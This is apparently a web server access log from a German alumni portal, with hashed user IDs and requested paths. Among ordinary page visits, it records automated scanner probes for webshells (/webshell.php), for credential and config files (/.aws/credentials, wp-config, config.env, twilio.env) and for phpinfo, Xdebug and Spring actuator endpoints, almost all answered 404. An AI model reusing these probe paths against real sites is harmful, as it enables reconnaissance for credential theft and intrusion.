user;timestamp;referer;target;method;status
5ead24378ce2d5810b56b76e5e589b06d18fc6874d831b083db5084cbb3f1b7a;2025-11-19 01:12:00;;/webshell.php;GET;404
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 01:19:12;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 01:19:12;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
68a1f8e4f88a5697d56f9d953b255dcdb9fbf9ce3d1decdd47afb4bbe738e0db;2025-11-19 01:28:38;;/shell.php;GET;404
d9cea6d19401a6439b77aa7de8e9cd0afd38b80ad47b132f8e8744089c0fcb4d;2025-11-19 01:29:53;;/webshell;GET;404
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-19 01:33:39;;/;GET;200
7dd70f4798102f8dc7c4f57392eacb12fc8970c801753e8f37c7bc83f82bba6c;2025-11-19 01:35:12;;/aktuelles/meldungen?category=wissenschaft;GET;200
9f7f5352146d1a0da68e6cee7a52d0b4fc7a269ca247500c772e4e9ccfd185e9;2025-11-19 01:45:57;;/shell;GET;404
6322f17ff58b76c63c2b60341908c43173373a5fccf6bc581cdd9fad9bd81df4;2025-11-19 01:46:11;;/gruppen/hobby/sozialwissenschaften;GET;302
13155f0783ceffdf3bfc067a493297585800409f9750c657a07b3667d195d610;2025-11-19 01:47:37;;/;GET;200
c02e585ad1328b4ce751737884d98c58b6595ea907c5b6602f89669fbea0c97a;2025-11-19 01:47:53;;/docs/img/logout.svg;GET;404
7823bfdafd81aac0bbee815fed4596f6e2207134fbc15a7bf0a97c86753ce9a7;2025-11-19 01:48:17;;/webshell;GET;404
87d24795c4582c9b3eb2da5882cf87cd198d2fa272cde3f03f5bea3d005979a0;2025-11-19 01:51:35;;/webshell.php;GET;404
14fca039f6d723e1a3e9ddacbf5c2364768691dd3167691562f496ef950bb1d5;2025-11-19 01:52:23;;/;GET;200
f887db10f5898514680a50735e1a341f769e0aaf77d74c6cbaa22d2bc38de90b;2025-11-19 01:54:19;;/;GET;200
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-19 01:55:17;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 01:58:38;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/5506;GET;200
21a3b0d0883539595f4a9321aa38ab4bfc87df088e3aac867d0b252432fc20ac;2025-11-19 01:59:00;/;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 02:00:02;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/183052;GET;200
2cf357dbba8e3dc3f6e0c57af017090988b506b68644bd3cb5925eb7b9ac2cbf;2025-11-19 02:02:01;;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 02:07:49;/personen/alumni/details/josephine-muller;/personen/alumni/details/josephine-muller;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 02:12:15;;/favicon.192x192.png;GET;404
e8f2f853638e327a26ae6b20ae7dd35c4ff207587874a997a6396c1d7b7a0d60;2025-11-19 02:12:41;;/;HEAD;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-19 02:15:50;;/gruppen/hobby/vogelbeobachtung;GET;302
dd2af611d1e2f2d23f99a9bc1ec5e1b42395c16b386b783f7078ca97e3c98105;2025-11-19 02:23:40;;/;GET;200
6da684d88bf7ee04b7d0dace8c20402492572d32e8d270604b62d85a6fd7c0d5;2025-11-19 02:26:38;/;/;GET;200
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:26:59;;/;GET;200
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:09;;/ads.txt;GET;404
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:09;;/app-ads.txt;GET;404
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:10;;/sellers.json;GET;404
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 02:32:17;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 02:33:14;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 02:33:14;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
dd2af611d1e2f2d23f99a9bc1ec5e1b42395c16b386b783f7078ca97e3c98105;2025-11-19 02:38:02;;/sitemap.xml;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 02:38:40;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
15d310a50cad63e36eb549db63f94e19686a03f414c9941e84b6e52dbe01bc11;2025-11-19 02:53:04;;/personen/alumni/details/felix-fischer;GET;200
7fb20d3d6f6f562cf97ac39770d16ae1a0325553020f85391cf02eeea0848d39;2025-11-19 02:54:08;;/;GET;200
7fb20d3d6f6f562cf97ac39770d16ae1a0325553020f85391cf02eeea0848d39;2025-11-19 02:54:19;/;/about/allgemein;GET;200
00ae46a4743798a80afad65ec2d0265fc6dd7a8872e9d3b3b5857f3c26b96d4e;2025-11-19 02:56:02;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-19 03:03:41;;/?XDEBUG_SESSION_START=phpstorm;GET;200
c612c8e33f702a0bbef3634aa0eb029fa7689a75f6570177636d4421f650808c;2025-11-19 03:04:34;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 03:09:51;/gruppen/hobby/biologie;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 03:09:52;/gruppen/hobby/biologie;/gruppen;GET;200
4be85216f05427d3d925da3170f4c05f8052bb0905e568be7de5d82aae32c3b5;2025-11-19 03:23:38;;/reset-password;GET;200
7af86b19ce5c484390bba1a725ba71f3b46cda9066ef0abbab7ba157c2e92bc3;2025-11-19 03:29:05;/;/;GET;200
7af86b19ce5c484390bba1a725ba71f3b46cda9066ef0abbab7ba157c2e92bc3;2025-11-19 03:30:41;/;/;GET;200
40c9bdfd9967cdba840f6cc9d4aba0619b35ad0cbe6bd6a650dc624370067e3a;2025-11-19 03:34:47;/;/;GET;200
39526245f20a0a64951b08ab81d1089343573b1377a7aae37e35c0f419e0b5b3;2025-11-19 03:40:25;;/personen/alumni/details/sidney-dittrich;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-19 04:11:08;;/themen?category=community;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 04:11:18;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 04:11:33;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:22;;/;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:23;;/sendgrid.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:23;;/twilio.env;GET;404
90d49ab21e2e98cef6a87c5217805db0c26c480f504be36f2c19237a453dc05e;2025-11-19 04:14:24;;/personen/alumni/details/sami-teuchert;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:15;;/ab2g;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:16;;/ab2h;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:16;;/alive.php;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:19;;/;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:20;;/;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:20;;/teorema505?t=1;GET;404
9dfd57f2a7c88c49bbac1caf270521447f79a1dc5f31508211f881372ac44c68;2025-11-19 04:26:01;;/;GET;200
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 04:29:11;;/;GET;200
1a24e3deee64e524cb59b79fbabf79166b09741e576ffea55e864608519b34d8;2025-11-19 04:33:30;;/;GET;200
1a24e3deee64e524cb59b79fbabf79166b09741e576ffea55e864608519b34d8;2025-11-19 04:33:30;;/;GET;200
3100652c05be2b726b399c79c07104ada90a3563e685cc34e0abbfb3b01cc158;2025-11-19 04:35:03;;/wp-content/;GET;404
d0d1fe322ac94d3a622e2b6f84b0133b1d28a3e0944089ec75449ec25e89d4f1;2025-11-19 04:40:57;;/personen/alumni/details/luca-onorini;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-19 04:44:41;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-19 04:49:57;;/actuator/gateway/routes;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 04:51:25;/gruppen/hobby/biologie;/gruppen/hobby/lesen;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 04:51:26;/gruppen/hobby/biologie;/gruppen;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-19 04:52:46;/gruppen/hobby/biologie;/gruppen/hobby/fremdsprachen;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-19 04:52:47;/gruppen/hobby/biologie;/gruppen;GET;200
a6358c16800dc001dec3fa61b24dcec8134a91882323a20eff094fcc57038086;2025-11-19 04:58:53;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 05:01:55;;/personen/alumni/schule/4240628;GET;200
00ecdbf98b90e6d582f1d323c955f2950ebcce223f7ab65082520149d3fb3976;2025-11-19 05:05:18;;/gruppen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:30;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:31;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:41;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:54;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:56;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:56;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:28;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:40;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:48;;/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:22;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:41;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:48;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:56;;/aws-secret.yaml;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:21;;/env.backup;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/xampp/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/lara/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/lara/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/laravel/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/shared/config/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/shared/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/service/email_service.py;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/server/config/database.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/scripts/nodemailer.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/.aws/credentials;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/dashboard/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/main.141b0494.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/2.ca066a4b.chunk.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/main.e85f7a37.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/admin/server_info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server_info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/app_dev.php/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/test.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server-info;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server-info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/secured/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/config.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/appsettings.json;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/shared/config/config.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config/aws.yml;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/settings.py;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config.json;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config/constants.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/application.properties;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/public/js/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/js/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/?phpinfo=1;GET;200
3ba70cd48dd81f25e5ee7e0d0d9576d339dbcd25a52bdc5d456ce9c9b3c150d6;2025-11-19 05:27:53;;/;GET;200
102a7f91bd6509d03a9f46c5ec9f1b0e30b080c4e501e724bf1c9f673d4bf7e8;2025-11-19 05:29:42;;/personen/alumni/details/josephine-muller;GET;200
80db4c5995539e53579176eeb9be27bf0bb8c3242b99c6049d839e4f27229174;2025-11-19 05:31:11;;/aktuelles/meldungen?category=community;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 05:33:17;;/personen/alumni/schule/4240628;GET;200
f7935a091cef300ed7866fb32936d10f677698882d33f3895caebd9d30532748;2025-11-19 05:41:54;;/per;GET;404
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 05:46:59;;/;GET;200
898dadbe3663b29c0519ce0b36d243c0f5c2d51ea43962ac7b1b9bdda4c25f35;2025-11-19 05:47:28;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 05:47:52;;/personen/alumni/schule/9009;GET;200
14b5401f661320b0b245cfafec72f9f4b4d5ed8934cd2bd9fc02a8be408fa664;2025-11-19 05:55:52;;/;GET;200
d443d894f48565f31b8185855cb137b806483104dcb2d4df7edd27c3453fbf48;2025-11-19 06:08:42;;/;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-19 06:14:01;;/;GET;200
0764d84419c08f57713e96ffb7c66b7ab7a64cdf2d548580829a84ba32137dbb;2025-11-19 06:17:37;;/;GET;200
602ab43109481a92b73988128e66ee5028cbf17514c935096c4b815bbdb5c369;2025-11-19 06:18:46;;/;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:18:57;;/dns-query?dns=DjMBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:18:59;;/dns-query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:00;;/dns-query?dns=HP4BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:03;;/dns-query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:07;;/query?dns=KywBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:14;;/query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:19;;/query?dns=uIoBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:29;;/query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:32;;/resolve?dns=gPEBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:41;;/resolve?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:46;;/resolve?dns=7O0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:53;;/resolve?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:55;;/?dns=zE0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:03;;/?name=example.com&type=A;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:09;;/?dns=Dy0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:24;;/?name=example.com&type=A;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:01;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:09;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:09;;/webui;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:11;;/webui;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:11;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:15;;/;GET;200
